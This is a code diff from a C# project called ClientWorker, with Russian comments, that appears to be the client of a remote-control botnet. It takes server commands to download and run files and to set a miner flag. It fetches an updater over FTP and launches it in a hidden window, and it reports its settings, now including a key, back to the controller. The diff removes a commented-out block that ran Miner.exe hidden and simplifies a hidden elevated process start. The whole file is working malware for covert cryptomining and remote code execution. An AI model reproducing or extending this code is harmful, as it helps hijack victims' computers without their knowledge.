@@ -45,26 +45,12 @@ namespace ClientWorker
                     Log.Send("DownloadAndRun()");
                     break;
 
-                case "DownloadFloader":
-                    //=====================================================>> Исправить
+                case "DownloadFloader":                   
                     FileManager.DownloadFloader(parametrs[0], parametrs[1]);                 
                     Service.Properties.Settings.Default.IsMiner = true;
                     Service.Properties.Settings.Default.Save();
                     Log.Send("DownloadFloader()");
                     break;
-
-                //case "RunMiner":
-                //    //=====================================================>> Исправить
-                //    try
-                //    {
-                //        FileManager.RunHideProc(parametrs[1] + @"\Miner.exe");
-                //    }
-                //    catch (Exception ex)
-                //    {
-                //        Log.Send("Ошибка при запуске файла" + ex.Message);
-                //    }
-                //    Log.Send("RunHideProc()");
-                //    break;
 
                 case "RunProgram":
                     foreach (string prm in parametrs)
@@ -104,34 +90,32 @@ namespace ClientWorker
             {
                 KillUpdater();
                 FtpClient.DownloadF(StartData.updater, folderPath + StartData.floaderNewCopy);
-                new Process
-                {
-                    StartInfo =
-                    {
-                        FileName = folderPath + StartData.floaderNewCopy + StartData.updater,
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        Verb = "runas",
-                        Arguments = Program.nameProc
-                    }
-                }.Start();
+                FileManager.RunHideProc(folderPath + StartData.floaderNewCopy + StartData.updater);              
             }
             catch (Exception ex)
             {
-                Log.Send("The start process failed: " + ex.ToString());
+                Log.Send("GetUpd failed: " + ex.ToString());
             }
         }
 
         private void KillUpdater()
         {
-            foreach (Process process in Process.GetProcessesByName("Updater"))
+            try
             {
-                process.Kill();
+                foreach (Process process in Process.GetProcessesByName("Updater"))
+                {
+                    process.Kill();
+                }
+
+                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                folderPath += StartData.floaderNewCopy;
+
+                File.Delete(folderPath + StartData.updater);
             }
-
-            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-            folderPath += StartData.floaderNewCopy;
-
-            File.Delete(folderPath + StartData.updater);
+            catch (Exception ex)
+            {
+                Log.Send("Не удалось удалить Updater: "+ex.Message);
+            }
         }
         public void Reconnect()
         {
@@ -156,6 +140,7 @@ namespace ClientWorker
                 Service.Properties.Settings.Default.IsMiner + StartData.delimiter +
                 Service.Properties.Settings.Default.Open_sum + StartData.delimiter +
                 Service.Properties.Settings.Default.Start_time + StartData.delimiter +
+                Service.Properties.Settings.Default.Key + StartData.delimiter +
                 Service.Properties.Settings.Default.Version + StartData.delimiter + "EndSetting";
 
             Program.netSender.SendMessage(message);
